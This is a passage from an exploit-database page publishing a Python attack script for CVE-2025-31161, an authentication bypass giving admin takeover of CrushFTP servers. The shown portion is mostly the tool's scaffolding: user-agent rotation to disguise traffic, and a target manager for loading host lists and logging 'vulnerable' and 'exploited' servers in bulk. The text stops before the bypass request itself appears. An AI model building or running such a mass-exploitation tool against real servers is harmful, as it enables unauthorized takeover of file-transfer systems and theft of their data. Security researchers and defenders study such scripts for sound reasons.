---
title: CrushFTP 11.3.1 Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2025050037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-20
fetch_date: 2025-10-06T22:23:26.444027
---

# CrushFTP 11.3.1 Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CrushFTP 11.3.1 Authentication Bypass** **2025.05.19**  Credit:  **[ibrahimsql](https://cxsecurity.com/author/ibrahimsql/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-31161](https://cxsecurity.com/cveshow/CVE-2025-31161/ "Click to see CVE-2025-31161")**  CWE: **N/A** | |

# Exploit Title: CrushFTP 11.3.1 - Authentication Bypass
# Date: 2025-05-15
# Exploit Author: @İbrahimsql
# Exploit Author's github: https://github.com/ibrahimsql
# Vendor Homepage: https://www.crushftp.com
# Software Link: https://www.crushftp.com/download.html
# Version: < 10.8.4, < 11.3.1
# Tested on: Ubuntu 22.04 LTS, Windows Server 2019, Kali Linux 2024.1
# CVE: CVE-2025-31161
# Description:
# CrushFTP before 10.8.4 and 11.3.1 allows unauthenticated HTTP(S) port access and full admin takeover
# through a race condition and header parsing logic flaw in the AWS4-HMAC authorization mechanism.
# Exploiting this allows bypassing authentication and logging in as any known user (e.g. crushadmin).
# Requirements: requests>=2.28.1 , colorama>=0.4.6 , urllib3>=1.26.12 , prettytable>=2.5.0 , rich>=12.6.0
#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
import argparse
import concurrent.futures
import json
import logging
import os
import random
import re
import socket
import string
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Union
import requests
import urllib3
from colorama import Fore, Style, init
from prettytable import PrettyTable
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
# Initialize colorama
init(autoreset=True)
# Disable SSL warnings
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
# Initialize Rich console
console = Console()
# Global variables
VERSION = "2.0.0"
USER\_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11\_5\_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
"Mozilla/5.0 (Windows; Windows NT 10.3; WOW64) AppleWebKit/601.13 (KHTML, like Gecko) Chrome/53.0.2198.319 Safari/601.5 Edge/15.63524",
"Mozilla/5.0 (Windows NT 10.2; Win64; x64; en-US) AppleWebKit/602.15 (KHTML, like Gecko) Chrome/47.0.1044.126 Safari/533.2 Edge/9.25098",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Win64; x64; en-US Trident/4.0)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10\_7\_9; like Mac OS X) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/49.0.1015.193 Mobile Safari/600.9"
]
# Banner
BANNER = fr"""
{Fore.CYAN}
/ \_\_\_\_/\_\_\_\_\_\_ \_\_\_\_\_\_\_/ /\_ / \_\_\_\_/ /\_\_\_\_\_
/ / / \_\_\_/ / / / \_\_\_/ \_\_ \/ /\_ / \_\_/ \_\_ \
/ /\_\_\_/ / / /\_/ (\_\_ ) / / / \_\_/ / /\_/ /\_/ /
\\_\_\_\_/\_/ \\_\_,\_/\_\_\_\_/\_/ /\_/\_/ \\_\_/ .\_\_\_/
/\_/
{Fore.GREEN}CVE-2025-31161 Exploit {VERSION}{Fore.YELLOW} | {Fore.CYAN} Developer @ibrahimsql
{Style.RESET\_ALL}
"""
# Setup logging
def setup\_logging(log\_level: str, log\_file: Optional[str] = None) -> None:
"""Configure logging based on specified level and output file."""
numeric\_level = getattr(logging, log\_level.upper(), None)
if not isinstance(numeric\_level, int):
raise ValueError(f"Invalid log level: {log\_level}")
log\_format = "%(asctime)s - %(levelname)s - %(message)s"
handlers = []
if log\_file:
handlers.append(logging.FileHandler(log\_file))
handlers.append(logging.StreamHandler())
logging.basicConfig(
level=numeric\_level,
format=log\_format,
handlers=handlers
)
class TargetManager:
"""Manages target hosts and related operations."""
def \_\_init\_\_(self, target\_file: Optional[str] = None, single\_target: Optional[str] = None):
self.targets = []
self.vulnerable\_targets = []
self.exploited\_targets = []
if target\_file:
self.load\_targets\_from\_file(target\_file)
elif single\_target:
self.add\_target(single\_target)
def load\_targets\_from\_file(self, filename: str) -> None:
"""Load targets from a file."""
try:
with open(filename, "r") as f:
self.targets = [line.strip() for line in f if line.strip()]
if not self.targets:
logging.warning(f"Target file '{filename}' is empty or contains only whitespace.")
else:
logging.info(f"Loaded {len(self.targets)} targets from {filename}")
except FileNotFoundError:
logging.error(f"Target file '{filename}' not found.")
sys.exit(1)
except Exception as e:
logging.error(f"Error loading targets: {e}")
sys.exit(1)
def add\_target(self, target: str) -> None:
"""Add a single target."""
if target not in self.targets:
self.targets.append(target)
def mark\_as\_vulnerable(self, target: str) -> None:
"""Mark a target as vulnerable."""
if target not in self.vulnerable\_targets:
self.vulnerable\_targets.append(target)
def mark\_as\_exploited(self, target: str) -> None:
"""Mark a target as successfully exploited."""
if target not in self.exploited\_targets:
self.exploited\_targets.append(target)
def save\_results(self, output\_file: str, format\_type: str = "txt") -> None:
"""Save scan results to a file."""
try:
if format\_type.lower() == "json":
results = {
"scan\_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
"total\_targets": len(self.targets),
"vulnerable\_targets": self.vulnerable\_targets,
"exploited\_targets": self.exploited\_targets
}
with open(output\_file, "w") as f:
json.dump(results, f, indent=4)
elif format\_type.lower() == "csv":
with open(output\_file, "w") as f:
f.write("target,vulnerable,exploited\n")
for target in self.targets:
vulnerable = "Yes" if target in self.vulnerable\_targets else "No"
exploited = "Yes" if target in self.exploited\_targets else "No"
f.write(f"{target},{vulnerable},{exploited}\n")
else: # Default to txt
with open(output\_file, "w") as f:
f.write(f"Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M...